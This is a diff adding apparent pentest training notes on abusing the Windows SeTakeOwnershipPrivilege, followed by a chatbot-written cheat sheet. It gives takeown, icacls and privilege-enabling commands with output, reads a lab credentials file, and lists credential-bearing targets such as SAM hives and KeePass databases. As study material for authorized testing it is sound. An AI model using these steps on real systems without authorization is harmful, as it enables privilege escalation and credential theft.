@@ -1,0 +1,233 @@
+SeTakeOwnershipPrivilege grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns WRITE_OWNER rights over an object, meaning the user can change the owner within the object's security descriptor. Administrators are assigned this privilege by default. While it is rare to encounter a standard user account with this privilege, we may encounter a service account that, for example, is tasked with running backup jobs and VSS snapshots assigned this privilege. It may also be assigned a few others such as SeBackupPrivilege, SeRestorePrivilege, and SeSecurityPrivilege to control this account's privileges at a more granular level and not granting the account full local admin rights. These privileges on their own could likely be used to escalate privileges. Still, there may be times when we need to take ownership of specific files because other methods are blocked, or otherwise, do not work as expected. Abusing this privilege is a bit of an edge case. Still, it is worth understanding in-depth, especially since we may also find ourselves in a scenario in an Active Directory environment where we can assign this right to a specific user that we can control and leverage it to read a sensitive file on a file share.
+
+Advanced Security Settings for web.config file. Permissions list includes IIS_IUSRS with Read & execute, TrustedInstaller, SYSTEM, Administrators, and jordan with Full control.
+
+The setting can be set in Group Policy under:
+
+Computer Configuration ⇾ Windows Settings ⇾ Security Settings ⇾ Local Policies ⇾ User Rights Assignment
+Local Group Policy Editor showing 'Take ownership of files or other objects' policy. Default set to Administrators. Description warns of security risks and advises assigning to trusted users only.
+
+With this privilege, a user could take ownership of any file or object and make changes that could involve access to sensitive data, Remote Code Execution (RCE) or Denial-of-Service (DOS).
+
+Suppose we encounter a user with this privilege or assign it to them through an attack such as GPO abuse using SharpGPOAbuse. In that case, we could use this privilege to potentially take control of a shared folder or sensitive files such as a document containing passwords or an SSH key.
+
+Leveraging the Privilege
+Reviewing Current User Privileges
+Let's review our current user's privileges.
+
+  SeTakeOwnershipPrivilege
+PS C:\htb> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                                              State
+============================= ======================================================= ========
+SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
+Enabling SeTakeOwnershipPrivilege
+Notice from the output that the privilege is not enabled. We can enable it using this script which is detailed in this blog post, as well as this one which builds on the initial concept.
+
+  SeTakeOwnershipPrivilege
+PS C:\htb> Import-Module .\Enable-Privilege.ps1
+PS C:\htb> .\EnableAllTokenPrivs.ps1
+PS C:\htb> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                              State
+============================= ======================================== =======
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
+Choosing a Target File
+Next, choose a target file and confirm the current ownership. For our purposes, we'll target an interesting file found on a file share. It is common to encounter file shares with Public and Private directories with subdirectories set up by department. Given a user's role in the company, they can often access specific files/directories. Even with a structure like this, a sysadmin may misconfigure permissions on directories and subdirectories, making file shares a rich source of information for us once we have obtained Active Directory credentials (and sometimes even without needing credentials). For our scenario, let's assume that we have access to the target company's file share and can freely browse both the Private and Public subdirectories. For the most part, we find that permissions are set up strictly, and we have not found any interesting information on the Public portion of the file share. In browsing the Private portion, we find that all Domain Users can list the contents of certain subdirectories but get an Access denied message when trying to read the contents of most files. We find a file named cred.txt under the IT subdirectory of the Private share folder during our enumeration.
+
+Given that our user account has SeTakeOwnershipPrivilege (which may have already been granted), or we exploit some other misconfiguration such as an overly permissive Group Policy Object (GPO) to grant our user account that privilege) we can leverage it to read any file of our choosing.
+
+Note: Take great care when performing a potentially destructive action like changing file ownership, as it could cause an application to stop working or disrupt user(s) of the target object. Changing the ownership of an important file, such as a live web.config file, is not something we would do without consent from our client first. Furthermore, changing ownership of a file buried down several subdirectories (while changing each subdirectory permission on the way down) may be difficult to revert and should be avoided.
+
+Let's check out our target file to gather a bit more information about it.
+
+  SeTakeOwnershipPrivilege
+PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+ 
+FullName                                 LastWriteTime         Attributes Owner
+--------                                 -------------         ---------- -----
+C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
+Checking File Ownership
+We can see that the owner is not shown, meaning that we likely do not have enough permissions over the object to view those details. We can back up a bit and check out the owner of the IT directory.
+
+  SeTakeOwnershipPrivilege
+PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'
+
+ Volume in drive C has no label.
+ Volume Serial Number is 0C92-675B
+ 
+ Directory of C:\Department Shares\Private\IT
+ 
+06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
+06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
+06/18/2021  12:23 PM                36 ...                    cred.txt
+               1 File(s)             36 bytes
+               2 Dir(s)  17,079,754,752 bytes free
+We can see that the IT share appears to be owned by a service account and does contain a file cred.txt with some data inside it.
+
+Taking Ownership of the File
+Now we can use the takeown Windows binary to change ownership of the file.
+
+  SeTakeOwnershipPrivilege
+PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+ 
+SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
+Confirming Ownership Changed
+We can confirm ownership using the same command as before. We now see that our user account is the file owner.
+
+  SeTakeOwnershipPrivilege
+PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
+ 
+Name     Directory                       Owner
+----     ---------                       -----
+cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
+Modifying the File ACL
+We may still not be able to read the file and need to modify the file ACL using icacls to be able to read it.
+
+  SeTakeOwnershipPrivilege
+PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'
+
+cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
+At line:1 char:1
++ cat 'C:\Department Shares\Private\IT\cred.txt'
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
+   horizedAccessException
+    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+Let's grant our user full privileges over the target file.
+
+  SeTakeOwnershipPrivilege
+PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+
+processed file: C:\Department Shares\Private\IT\cred.txt
+Successfully processed 1 files; Failed processing 0 files
+Reading the File
+If all went to plan, we can now read the target file from the command line, open it if we have RDP access, or copy it down to our attack system for additional processing (such as cracking the password for a KeePass database.
+
+  SeTakeOwnershipPrivilege
+PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'
+
+NIX01 admin
+ 
+root:n1X_p0wer_us3er!
+After performing these changes, we would want to make every effort to revert the permissions/file ownership. If we cannot for some reason, we should alert our client and carefully document the modifications in an appendix of our report deliverable. Again, leveraging this permission can be considered a destructive action and should be done with great care. Some clients may prefer that we document the ability to perform the action as evidence of a misconfiguration but not fully take advantage of the flaw due to the potential impact.
+
+When to Use?
+Files of Interest
+Some local files of interest may include:
+
+  SeTakeOwnershipPrivilege
+c:\inetpub\wwwwroot\web.config
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+We may also come across .kdbx KeePass database files, OneNote notebooks, files such as passwords.*, pass.*, creds.*, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.
+
+
+GPT SUMMARY 
+
+🧠 Summary
+SeTakeOwnershipPrivilege gives a user the ability to take ownership of any securable object, even if they don’t have normal permissions to access it.
+
+It grants WRITE_OWNER access → lets you change the object’s owner to yourself, then modify its ACL to give yourself full control.
+
+Usually assigned to admins, but can sometimes be seen on service or backup accounts (e.g., VSS, SCCM, backup tools).
+
+Can be leveraged to read sensitive files like cred.txt, web.config, .kdbx, or even SAM/system registry hives.
+
+Low-frequency, high-impact privilege — good to recognize and use when other privesc paths are blocked.
+
+🔁 Got This, Do That Workflow
+🔍 Enumeration Phase
+✅ Run:
+
+powershell
+Copy
+Edit
+whoami /priv
+If SeTakeOwnershipPrivilege is present: 👉 You’ve got the green light to take over and read restricted files.
+
+🧨 Exploitation Flow (PowerShell/RDP shell)
+Enable the privilege:
+
+powershell
+Copy
+Edit
+Import-Module .\Enable-Privilege.ps1
+.\EnableAllTokenPrivs.ps1
+Choose a target file (e.g., cred.txt, .kdbx, etc.)
+
+Take ownership:
+
+powershell
+Copy
+Edit
+takeown /f "C:\path\to\file.txt"
+Grant yourself full permissions:
+
+powershell
+Copy
+Edit
+icacls "C:\path\to\file.txt" /grant <user>:F
+Read the file:
+
+powershell
+Copy
+Edit
+cat "C:\path\to\file.txt"
+🔀 If This, Then That Decision Tree
+Condition	Action
+Found SeTakeOwnershipPrivilege	Enable it via PowerShell and proceed to take ownership
+Can’t read file but can see it exists	Use takeown + icacls to change access
+Still denied access	Ensure you applied full rights to both file and containing folders
+Can’t upload tools	Use built-in PowerShell or fallback to cmd
+File is sensitive (e.g., config/SAM)	Proceed with caution, document actions, and revert ownership if possible
+🧬 Patterns You Should Recognize
+Privilege is often seen on backup or support accounts (SCCM, VSS).
+
+Used in GPO abuse scenarios to assign yourself access.
+
+Rare on standard users, but when it’s there — very powerful.
+
+Combine with:
+
+SeBackupPrivilege to copy normally inaccessible files.
+
+SeRestorePrivilege to overwrite restricted files.
+
+💡 Hints / Tips
+If cat fails after taking ownership → always run:
+
+powershell
+Copy
+Edit
+icacls <target> /grant <user>:F
+This is perfect for grabbing:
+
+cred.txt, .kdbx, web.config, SAM, SYSTEM, KeePass dbs
+
+Don’t change ownership of active config files (like live web.config) unless explicitly permitted in a real-world engagement.
+
+If the target file is deep in a path, you may need to take ownership of each parent directory to get access.
+
+🔐 Files of Interest (for CPTS mindset):
+File	Why
+web.config	Contains DB creds or app secrets
+cred.txt, pass.*, passwords.txt	Obvious
+.kdbx	KeePass DB = jackpot
+C:\Windows\System32\config\SAM	Local account hashes
+repair\*, .sav, .evt	Registry backups & logs
